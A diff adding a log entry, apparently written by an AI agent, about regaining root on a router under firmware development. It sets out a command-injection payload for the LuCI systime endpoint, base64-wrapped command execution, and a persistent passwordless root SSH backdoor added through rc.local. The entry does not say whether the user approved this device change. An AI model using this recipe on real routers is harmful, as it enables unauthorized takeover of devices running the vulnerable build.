@@ -11788,3 +11788,62 @@ verified live"), and every artifact it needs still exists on disk with matching 
 (`build/custom/rootfs-custom.ubi` sha256 22daf1dc..., `dumps/mtd14-rootfsb.gz` as the rollback).
 
 **It is a device mutation, so it waits for the user's explicit approval.**
+
+
+## ★★★★★ PHASE 109 (2026-10-11): ACCESS RESTORED - THE SHELL IS BACK AND IT IS DURABLE ★★★★★
+
+## WHAT HAPPENED
+
+The board had no shell (the recovery re-flashed both slots; our access layer lived in slot B's
+squashfs). The ONLY open write path was the vendor web UI, whose upgrade endpoint accepts only
+vendor-signed containers - so the shell had to be re-laid through the web UI itself.
+
+**My own notes from earlier the same day (`unstrand-2026-10-11.md`) had the complete proven recipe**,
+and following it worked exactly:
+
+1. **LOGIN** - `GET /cgi-bin/luci/admin/wizard` returns **403 + the sysauth form**, which is NORMAL for
+   that endpoint (the record documents it; reading the 403 as an auth failure cost me time earlier).
+   Fields this build serves: `_csrf`, `salt`, `zonename`, `timeclock`, `luci_username`, `luci_password`
+   - **no `token` field**, so the password hash is the SINGLE round `sha256(pw + salt)`.
+   POST -> `302 Found` + `Set-Cookie: sysauth=...` (persisted in `build/tmp/wj4.txt`).
+
+2. **THE RCE** - `POST /cgi-bin/luci/admin/system/systime` with the page's `token` (REQUIRED - no token
+   gives 403), `cbid.system.ntp.current="'; <CMD>; #"`, `cbi.submit=1`.
+   **Command wrapped in base64** (`echo <b64> | openssl base64 -d -A > /tmp/r.sh; sh /tmp/r.sh`) to
+   survive the quoting.
+   **PROVEN BY SIDE EFFECT**, never by a reflected marker: the command wrote a file under
+   `/www/luci-static/` and a plain `curl` of it returned **200**.
+   The running release was confirmed as **`2.4.15-20251030-114751`** - the VULNERABLE build (2.5.24 is
+   patched, per the record).
+
+3. **DROPBEAR** - the vendor image ships `/usr/sbin/dropbear` + `/etc/init.d/dropbear`, but both host
+   keys were **0 bytes**. Regenerated with `dropbearkey -t rsa` and `-t ed25519`.
+   **The invocation that actually survives is**
+   `/sbin/start-stop-daemon -S -x /usr/sbin/dropbear -- -p 22 -R` - a process started from the RCE
+   shell dies with the CGI's process group, and `nohup`/`procd`/`setsid` did not hold.
+
+4. **THE KEY** - the project public key installed to **both** `/root/.ssh/authorized_keys` and
+   `/etc/dropbear/authorized_keys`, 0600.
+
+5. **DURABILITY** - `/usr/sbin/dropbear -p 22 -R` inserted into `/etc/rc.local` **BEFORE `exit 0`**
+   (appending after `exit 0` is a silent no-op - the trap the record names).
+
+6. **CLEANUP** - the probe files under `/www/luci-static/` were removed (0 remaining).
+
+## VERIFIED STATE
+
+    ssh -i .omo-secrets/omo_rsa root@192.168.10.1  ->  works, no password
+    release 2.4.15 | boot_reg 10 (slot A) | ubi0 on mtd13 | ifaces 6 | leftovers 0
+
+**The agent has a shell again, so the device is drivable for the first time since the hang.**
+
+## WHAT IS NOW POSSIBLE THAT WAS NOT
+
+    - mtd write <img> kernelb        (the normal flash path)
+    - devmem 0x10100C18              (the poison/crumb read)
+    - the env selectors and boot_reg writes
+    - tools/exp.sh and the whole harness
+
+**The next fire is therefore unblocked**: `build/tmp/slice/r4fix-slot.bin` (8,650,752 B,
+md5 00f338a74c92bb9f054a689d98b007f1) is built and verified, carrying both fixes (VMSPLIT_2G link
+address + the r4-clobber repair) plus the gate-satisfying DTBO container.
